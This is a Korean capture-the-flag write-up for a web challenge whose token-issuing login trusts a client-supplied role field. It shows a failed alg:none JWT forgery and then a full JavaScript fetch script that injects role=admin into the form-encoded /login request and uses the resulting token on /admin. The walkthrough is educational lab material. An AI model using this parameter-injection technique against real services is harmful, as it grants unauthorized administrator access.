문제설명:

아이디만 입력하면 로그인되고, 그 이후 서명된 토큰으로 `/admin` 접근을 시도할 수 있는 단체 포털이다.

목표:

발급받은 토큰으로 관리자 권한을 얻어라

writeup :

페이지를 들어가면 이용권 발급란이 있고, 발급받은 토큰으로 운영본부 전용창구를 열어볼 수 있는지 확인하는 란이 있다.
페이지에 적힌글을 통해 Post/login은 아이디만으로 서명된 토큰을 발급한다는것, 그 토큰을 authorization: bearer <token> 으로 /admin에 보내야한다는것을 알 수 있었다.

guest 로 이용권을 발급받으면
다음과 같은 토큰이 나온다. 

 "token": "eyJhbGciOiAiSFMyNTYifQ==.eyJ1c2VybmFtZSI6ICJndWVzdCIsICJyb2xlIjogImd1ZXN0In0=.dc9fc4a87109d2cbbc842fceee0045d768f8ee96ca363e863caec46d0a0808ff"



base64로 디코딩해보면
header에서 hs256 알고리즘이 사용되었다는것, payload가 username: guest, role: guest 로 되어있다는것을 알 수 있었다.

그래서 alg를 none으로 하고 서명을. 으로 변조해서 토큰을 생성해보았다.
하지만 유효하지않은 토큰이라는 메세지가 떴다.

직접 role : admin이라는것을 login에 보내야했다.
request header을 보니 content-type  이 application/x-www-form-urlencoded인것을 확인할 수 있었다.

기본적인 내용을 내가 재미나이에게 주고 재미나이가 코드를 짜주는 식으로 코드를 붙여넣었다. 코드는 다음과 같다  

(async () => {
    try {
        // Form URL-encoded 형태로 데이터 준비 (username과 role을 주입)
        const formData = new URLSearchParams();
        formData.append('username', 'guest');
        formData.append('role', 'admin');

        // 1. /login에 Form 데이터 형식으로 POST 요청
        console.log("[*] Form Data 방식으로 role=admin 주입 중...");
        const loginResponse = await fetch('/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData
        });

        const loginData = await loginResponse.json();
        const token = loginData.token;
        
        if (!token) {
            console.error("[-] 토큰을 받지 못했습니다. 서버 응답을 확인하세요:", loginData);
            return;
        }
        
        console.log("[+] 발급된 토큰:", token);

        // 2. 발급받은 토큰을 헤더에 담아 /admin에 GET 요청
        console.log("[*] 발급된 토큰으로 /admin 페이지 호출 중...");
        const adminResponse = await fetch('/admin', {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

        const resultText = await adminResponse.text();
        console.log("%c[+] 서버 응답 결과 (Flag를 찾아보세요):", "color: green; font-weight: bold;");
        console.log(resultText);

    } catch (error) {
        console.error("[-] 에러 발생:", error);
    }
})();

async 은 비동기 함수이다.

 

비동기 함수란?

특정 작업이 끝날 때까지 기다리지 않고, 다음 코드를 곧바로 실행하는 프로그래밍 방식이다.


우선 웹 브라우저는 한번에 한 가지 일밖에 못하는 싱글스레드 이다. 그래서 만약 서버에서 큰 데이터를 받아오는 함수를 동기방식으로 실행한다면 데이터를 다 받아올때까지 브라우저가 움직이지않는다. (마우스 클릭과 화면스크롤을포함해서.. )

아마 get과 post를 같이 써서 코드를 실행하는데 시간이 좀 걸려 비동기함수를 사용한듯하다.

 

 

const formData = new URLSearchParams();
formData.append('username', 'guest');
formData.append('role', 'admin');


URLSearchParams()는 key 값과 value 쌍으로 되어있다.

서버가 원하는 방식에 맞춰 URLSearchParams를 구성했다.
인터넷 주소창에는  ?username=guest&role=admin 이런식으로 나온다

 

const loginResponse = await fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: formData
});
const loginData = await loginResponse.json();
const token = loginData.token;

 

페이지에 적혀있는대로 POST로 token을 발급받는다. 이때, 아까정의한 formData를 body 에 준다.

그리고 서버가 보낸 응답을 json형태로 변환한다. 이때는 기다려야하므로 await가 붙는다.
서버가 발급해 준 jwt 토큰을 저장한다. 

 

console.log("[*] 발급된 토큰으로 /admin 페이지 호출 중...");
const adminResponse = await fetch('/admin', {
    method: 'GET',
    headers: {
        'Authorization': `Bearer ${token}`
    }
});
const resultText = await adminResponse.text();
console.log("%c[+] 서버 응답 결과 (Flag를 찾아보세요):", "color: green; font-weight: bold;");

이제 아까받았던 토큰을 가지고 admin에 접근한다.

그러면 flag가 나온다.

 

 

이번 문제를 풀면서 삽질을 정말 많이 했는데 URLSearchParams()

 

1. json 문자열로 보내기

2. 토큰 직접만들기

3. alg : none사용

 

이것만 계속하면서 왜 안되지만 반복하고 있었다.
